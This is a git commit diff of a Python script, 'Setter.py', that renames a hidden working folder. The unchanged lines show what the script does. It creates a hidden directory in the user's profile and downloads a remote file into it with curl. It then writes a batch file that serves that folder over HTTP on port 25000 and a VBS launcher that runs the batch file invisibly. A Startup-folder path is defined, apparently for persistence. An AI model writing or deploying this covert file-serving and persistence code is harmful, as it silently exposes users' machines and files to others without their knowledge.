9a7edb6e19d4d57e111c24fd3e0d4dfaf84be57e
darwin08-os <harshgajjar7242@gmail.com>
2026-03-18 09:15:35 +0530

    Update Setter.py

--- Setter.py
+++ Setter.py
@@ -5,18 +5,18 @@ user = os.getlogin()
 startup_path = fr"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
 os.chdir(f"C:/Users/{user}/")
-os.mkdir("OST")
-os.system("attrib +h OST")
-os.chdir(f"C:/Users/{user}/OST/")
+os.mkdir("OSTML")
+os.system("attrib +h OSTML")
+os.chdir(f"C:/Users/{user}/OSTML/")
 os.system("curl -o prac.pdf https://raw.githubusercontent.com/darwin08-os/Temp/main/prac.txt")
 
 bat_content = f'''@echo off \
-cd "C:/Users/{user}/OST/" \
+cd "C:/Users/{user}/OSTML/" \
 "{sys.executable}" -m http.server 25000'''
 
 vbs_content = fr'''
 set code = CreateObject("WScript.shell")
-code.Run "C:/Users/{user}/OST/xyz.bat",0,False
+code.Run "C:/Users/{user}/OSTML/xyz.bat",0,False
 '''
 
 with open("xyz.bat","w") as f:
